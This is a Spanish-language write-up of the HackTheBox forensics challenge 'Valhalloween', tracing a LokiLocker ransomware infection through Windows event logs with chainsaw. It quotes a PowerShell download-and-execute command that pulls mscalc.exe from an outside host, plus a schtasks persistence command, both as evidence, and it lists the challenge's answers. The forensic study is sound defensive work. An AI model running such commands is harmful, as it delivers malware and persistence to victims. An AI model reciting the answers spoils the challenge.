---
title: Valhalloween
description: >
  HackTheBox Forensics Challenge - Easy<br>
  [Challenge Download](https://app.hackthebox.com/challenges/621)
date: 2024-05-08
weight: 10
tags: ["htb","forensics","easy", "windowsevtx", "chainsaw", "logs"]
---

---
# Enunciado del problema

As I was walking the neighbor's streets for some Trick-or-Treat, a strange man approached me, saying he was dressed as "The God of Mischief!". He handed me some candy and disappeared. Among the candy bars was a USB in disguise, and when I plugged it

---
# Resolución

Como nos dan una instacia, nos conectamos con *net-cat* y nos empiezan a preguntar sobre un ransomware... y lo único proporcionado por la plataforma es un directorio llego de archivos *.evtx*, como es de costumbre abriremos los archivos que no tengan que ver con *Microsoft*

```powershell
Application.evtx
DebugChannel.etl
HardwareEvents.evtx
Internet Explorer.evtx
Key Management Service.evtx
OAlerts.evtx
OpenSSH%4Admin.evtx
OpenSSH%4Operational.evtx
Parameters.evtx
Security.evtx
Setup.evtx
SMSApi.evtx
State.evtx
System.evtx
Windows PowerShell.evtx
```

### What are the IP address and port of the server from which the malicious actors downloaded the ransomware? (for example: 98.76.54.32:443)

Nada más abrir el archivo: *Windows Powershell.evtx*, encontramos un archivo que ejecuta el comando:

```powershell
powershell.exe (new-object system.net.webclient).downloadfile('http://103.162.14.116:8888/mscalc.exe','C:\Users\HoaGay\AppData\Local\Temp\mscalc.exe');start-process 'C:\Users\HoaGay\AppData\Local\Temp\mscalc.exe'
```

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240512112830.png)

Correct answer: `103.162.14.116:8888

### According to the sysmon logs, what is the MD5 hash of the ransomware? (for example: 6ab0e507bcc2fad463959aa8be2d782f)

Como sabemos que el archivo se llama: `mscalc.exe`, usaremos la heramienta: *chainsaw* y filtraremos por ese archivo:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240512154510.png)

Si nos fijamos bien hay una variable que contiene el hash:

```powershell
. . . "Hashes":"MD5=B94F3FF666D9781CB69088658CD53772","Image":"C:\\Users\\HoaGay\\AppData\\Local\\Temp\\mscalc.exe" . . .
```

### Based on the hash found, determine the family label of the ransomware in the wild from online reports such as Virus Total, Hybrid Analysis, etc. (for example: wannacry)

Como nos piden el tipo de virus buscaremos en bases de datos conocidas para ver si alguien escaneo el ejecutable y vemos la información del archivo, y asi es, tenemos información sobre el virus: https://www.virustotal.com/gui/file/7c890018d49fe085cd8b78efd1f921cc01936c190284a50e3c2a0b36917c9e10

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240512154917.png)

Correct answer:
```powershell
lokilocker
```

### What is the name of the task scheduled by the ransomware? (for example: WindowsUpdater)

En windows `schtasks` es el sustitutente de *crontab* de linux, si buscamos en chainsaw por ese comando y leemos detenidamente, encontraremos una tarea ejecutada por el virus, llamada *Loki*

```powershell
. . . "CommandLine":"schtasks  /CREATE /SC ONLOGON /TN Loki /TR C:\\Users\\HoaGay\\AppData\\Roaming\\winlogon.exe /RU SYSTEM /RL HIGHEST /F" . . .
```

Sabemos que es Loki el nombre, porque gracias a la guia de microsoft: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-change, sabemos la estructura del comando:

```powershell
schtasks /change /tn <Taskname> [/s <computer> [/u [<domain>\]<user> [/p <password>]]] [/ru <username>] [/rp <password>] [/tr <Taskrun>] [/st <Starttime>] [/ri <interval>] [/rl <level>] [{/et <Endtime> | /du <duration>} [/k]] [/sd <Startdate>] [/ed <Enddate>] [/{ENABLE | DISABLE}] [/it] [/z]
```

### What are the parent process name and ID of the ransomware process? (for example: svchost.exe_4953)

Un simple comando y un par de búsquedas en google encontramos el ID:

```powershell
$> /mnt/c/Users/yoshl/Desktop/chainsaw_all_platforms+rules+examples/chainsaw/chainsaw_x86_64-pc-windows-msvc.exe search -i mscalc.exe . --json | gron | grep -E '\.Hashes|\.ParentCommandLine|\.ParentProcessId' | grep -A 3 B94F3FF666D9781CB69088658CD53772

 ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗███████╗ █████╗ ██╗    ██╗
██╔════╝██║  ██║██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║    ██║
██║     ███████║███████║██║██╔██╗ ██║███████╗███████║██║ █╗ ██║
██║     ██╔══██║██╔══██║██║██║╚██╗██║╚════██║██╔══██║██║███╗██║
╚██████╗██║  ██║██║  ██║██║██║ ╚████║███████║██║  ██║╚███╔███╔╝
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝
    By WithSecure Countercept (@FranticTyping, @AlexKornitzer)

[+] Loading forensic artefacts from: .
[+] Loaded 366 forensic files (121.4 MB)
[+] Searching forensic artefacts...
[+] Found 52 hits
json[4].Event.EventData.Hashes = "MD5=B94F3FF666D9781CB69088658CD53772";
json[4].Event.EventData.ParentCommandLine = "powershell.exe  (new-object system.net.webclient).downloadfile('http://103.162.14.116:8888/mscalc.exe','C:\\Users\\HoaGay\\AppData\\Local\\Temp\\mscalc.exe');start-process 'C:\\Users\\HoaGay\\AppData\\Local\\Temp\\mscalc.exe'";
json[4].Event.EventData.ParentProcessId = 3856;
json[5].Event.EventData.Hashes = "MD5=8A2122E8162DBEF04694B9C3E0B6CDEE";
```

Correct answer:
```powershell
powershell.exe_3856 
```

### Following the PPID, provide the file path of the initial stage in the infection chain. (for example: D:\Data\KCorp\FirstStage.pdf)

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240512155852.png)

Correct answer:
```powershell
C:\\Users\\HoaGay\\Documents\\Subjects\\Unexpe.docx\
```

### When was the first file in the infection chain opened (in UTC)? (for example: 1975-04-30_12:34:56)

Como nos piden a que hora fue infectado el archivo, vamos a buscar por ese archivo y filtrar por el tiempo:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240512160034.png)

Correct answer:
```powershell
2023-09-20 03:03:20
```

--- 

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240512160137.png)
